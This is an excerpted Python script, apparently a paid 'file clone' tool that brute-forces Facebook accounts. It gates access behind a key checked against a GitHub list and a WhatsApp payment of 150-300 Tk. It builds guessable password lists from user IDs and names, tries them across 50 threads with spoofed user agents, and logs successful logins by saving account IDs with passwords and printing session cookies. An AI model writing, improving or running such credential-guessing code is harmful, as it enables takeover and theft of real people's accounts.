...
def uaku():
        try:
                ...
                a=requests.get('https://github.com/TEAM-69-Hentai/Token/blob/main/Token.txt').text
                ua=open('.mix.txt','w')
...
def NAFISALWAYSONFIRE():
  ...
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/TEAM-69-Hentai/Token/blob/main/Token.txt').text
...
\033[1;36m============================================\n""")
  ...
  try:
    httpCaht = requests.get(f"https://github.com/TEAM-69-Hentai/Token/blob/main/Token.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/+880181367215')      
      print(f"Your Key Not Approved")      
      os.system('xdg-open https://wa.me/+880181367215')
      print(f"Send Key For Access This Tool"); time.sleep(1)
      os.system('am start https://wa.me/+880186136215?text=' + tks)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
\033[0;94m➣👾 \033[0;94m𝑾𝑯𝑨𝑻𝑺𝑨𝑷𝑷 : +8801773375432\033[0;94m
\033[0;94m➣👾 \033[0;94m𝑻𝑯𝑰𝑺 𝑻𝑶𝑶𝑳 𝑰𝑺 𝑷𝑨𝑰𝑫         \033[0;94m
\033[0;94m➣👾 \033[0;94m𝑽𝑬𝑹𝑺𝑰??𝑵       •X0.2   ] \033[0;94m
\033[0;94m➣👾 \033[0;94m𝑮𝑰𝑽𝑬 𝑴𝑬 150 𝒕𝒌 𝑭𝑶𝑹 𝑨𝑷𝑹𝑽𝑨𝑳  \033[0;94m
╠══[ 7 𝑫𝑨𝒀𝑺 150 𝑻𝒌➳
╠══[ 15 𝐷𝐴𝑌𝑆 300 𝑇𝑘➳
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
...
def menu():
    ...
    print("""\033[38;5;46m[\033[38;5;46m2\033[38;5;46m] \033[0;93muid clone""")        
    print('\033[0;97m=================')
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/Reyad.txt  Etc...]')
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/Hentai.Reyad.Ok.Bro")
    if hc in ['1','01']:
...
def man():
    ...
    print(f"\033[1;92m[\033[1;91m2\033[1;92m]FILE CLONE  ")
    print(f"\033[1;92m═══════════════════════════════════════════════")
    Reyad =input("\033[1;92m[\033[1;34m✓]\033[1;92mCHOOSE : ")
    if Reyad == '1':
    	bd()
    if Reyad == 'p':
        C1()
...
def bd():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','@@@###']
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mReyad-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [Reyad-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [💚] COOKIE : '+coki)
                open('/sdcard/Reyad-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/Reyad-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
